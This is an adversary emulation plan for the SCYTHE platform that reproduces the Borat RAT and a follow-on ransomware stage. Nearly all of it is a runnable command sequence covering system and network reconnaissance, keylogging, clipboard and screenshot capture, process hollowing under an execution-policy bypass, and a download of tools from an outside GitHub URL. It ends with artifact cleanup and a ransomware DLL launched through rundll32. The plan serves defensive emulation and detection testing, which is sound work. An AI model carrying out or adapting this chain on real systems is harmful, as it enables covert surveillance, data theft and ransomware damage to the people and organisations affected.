# Borat RAT - Adversary Emulation Plan

This threat was created by Randy Pargman from BinaryDefense based on the this threat intelligence from March 31, 2022: https://blog.cyble.com/2022/03/31/deep-dive-analysis-borat-rat/

## Automated Adversary Emulation with SCYTHE
This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-end execution. The breakout is the Borat RAT as stage 1 and the ransomware as stage 2.
### Borat RAT - Stage 1
1. Download and import the threats in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under BoratRAT/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/
4. Create a new campaign `BoratRAT` with HTTPS.
5. Import from Existing Threat: BoratRAT
6. Launch the Campaign

### Borat Ransomware - Stage 2
1. Create a new campaign `BoratRansomware` with HTTPS.
2. Select ransomware TTPs.
3. Launch the Campaign
4. Download payload in DLL format setting the entry-point to `entrypoint`
5. Save the DLL as `Ransomware.dll`
6. Upload the `Ransomware.dll` to the VFS under VFS:/shared/threats/

## Manual Adversary Emulation with SCYTHE
This is a multi-stage attack leveraging multiple payloads and execution that perform different TTPs. Manual emulation steps are below.

### Borat RAT - Stage 1
```
loader --load run
run cmd /c "echo ####System Info#### & systeminfo & echo ####System Vesion#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable##### & set & echo ####Logical Disk##### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators### & net localgroup administrators & echo ####Guest User#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipcofig#### & ipconfig /all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####FirewallInfo#### & netsh firewall show state & netsh firewall show config"
loader --load keylogger
keylogger --start
delay --time 300
keylogger --current
keylogger --stop
loader --load clipboard
clipboard
loader --load printscr
printscr --window Desktop
delay --time 180
clipboard
printscr --window Desktop
run cmd.exe /c set
run wmic logicaldisk get caption,description,providername
run net user
run net user administrator
run wmic startup get caption,command
run tasklist /svc
run ipconfig /all
run cmd.exe /c type C:\WINDOWS\System32\drivers\etc\hosts
run route print
run arp -a
run netstat -ano
run sc query type= service state= all
run cmd.exe /c netsh firewall show state & netsh firewall show config
loader --load downloader
loader --load file
loader --load upsh
downloader --src VFS:/shared/Start-Hollow.ps1 --dest %USERPROFILE%/Start-Hollow.ps1
run powershell.exe Set-ExecutionPolicy Bypass -Scope Process -Force ; Invoke-Command -ScriptBlock {. $env:userprofile\Start-Hollow.ps1; $ppid="Get-Process explorer | select -expand id"; Start-Hollow -Sponsor "C:\Windows\System32\calc.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose}
upsh --cmd "Invoke-Command -ScriptBlock {Stop-Process -Name "calc" -ErrorAction Ignore; }"
upsh --cmd "Invoke-Command -ScriptBlock { Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "$env:TEMP\Modified-SysInternalsSuite.zip"; Expand-Archive $env:TEMP\Modified-SysInternalsSuite.zip $env:TEMP\sysinternals -Force; Remove-Item $env:TEMP\Modified-SysInternalsSuite.zip -Force}"
upsh --cmd "if (Test-Path $env:TEMP\SysInternals) {echo 1} else {echo 0}"
upsh --cmd "Invoke-Command -ScriptBlock {Set-Location -path "$env:TEMP\Sysinternals";; ./accesschk.exe -accepteula .;}"
run powershell del $env:TEMP\Sysinternals -Force -Recurse -ErrorAction Ignore
run powershell.exe del $env:userprofile/Start-Hollow.ps1
downloader --src VFS:/shared/threats/Ransomware.dll --dest %TEMP%/Ransomware.dll
run powershell.exe rundll32.exe "%TEMP%/Ransomware.dll",entrypoint
controller --shutdown
```